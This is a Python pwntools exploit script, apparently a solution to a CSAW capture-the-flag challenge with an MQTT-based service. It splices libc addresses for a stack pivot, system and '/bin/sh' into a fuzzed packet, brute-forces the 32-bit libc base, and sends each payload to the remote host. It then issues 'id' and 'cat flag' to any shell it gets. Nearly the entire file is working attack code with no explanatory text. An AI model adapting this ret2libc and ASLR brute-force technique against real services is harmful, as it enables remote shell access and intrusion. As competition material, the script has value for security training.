#!/usr/bin/python3

import sys
from pwn import *
#import IPython
from multiprocessing import *

#context.log_level = 'debug'
#context.terminal = ['tmux','splitw','-h']

with open("pkts-fuzzed-9991", 'rb') as fd:
    data = fd.read()

libc_base = 0xf7000000  # 0xf7x??000    brute force 12 bits
add_esp_27c = 0x000619ad
libc_system = 0x3a850
libc_binsh = 0x15d7c8
guess_off = 0x33000

data = data[:0x20b] + p32(libc_base+add_esp_27c+guess_off) + data[0x20b+4:]
#libc_base = 0xf7e14000
#guess_off = 0
data = data[:0x190] + p32(libc_base+guess_off+libc_system) + b'BBBB' + p32(libc_base + guess_off+libc_binsh) + data[0x19c:]


#p = process(["gdb", "./mqtt_noalarm"])
#p.recvuntil('(gdb)')
#p.sendline('b *0x0804912f')
#p.recvuntil('(gdb)')
#p.sendline('r')
#sleep(1)
#p.recvuntil('Starting program:')
#p.send(data)
#p.interactive()

def pwn(o):
    global data
    localdata = data[:0x20b] + p32(libc_base+add_esp_27c+guess_off+o) + data[0x20b+4:]
    #libc_base = 0xf7e14000
    #guess_off = 0
    localdata = localdata[:0x190] + p32(libc_base+guess_off+libc_system+o) + b'BBBB' + p32(libc_base + guess_off+libc_binsh+o) + localdata[0x19c:]

    #p = process("./mqtt")
    p = remote("pwn.chal.csaw.io", 5009)
    p.send(localdata)
    sleep(1)
    try:
        p.sendline(b'id')
        #p.recvuntil('$')
        #if not p.poll():
        #    p.sendline('id')
        #    sleep(1)
        #    ret = (p.recvline(), p.poll(), hex(p.libs()['/lib32/libc-2.24.so']))
        #else:
        #    ret = ("err", p.poll(), hex(p.libs()['/lib32/libc-2.24.so']))
        print(p.recvline())
        sleep(1)
        p.sendline('cat flag')
        print(p.recvline())
        p.close()
    except:
        #ret = ("", p.poll(), hex(p.libs()['/lib32/libc-2.24.so']))
        pass
    ret='end'
    return ret

#with Pool(256) as p:
#    print(p.map(pwn, range(256))) 
for off in range(int(sys.argv[1]),int(sys.argv[2]),1):
    for i in range(256):
        print(pwn(off<<20))
#gdb.attach(p, '''
#    b *0x804b590 
#    b *0x0804912f
#    b *0x0804abcd
#    c
#''')

#data = data[:0x20b] + p32(0x0804abcd) + data[0x20b+4:]
#p.send(data)
#IPython.embed()
#print(data)
#p.interactive()
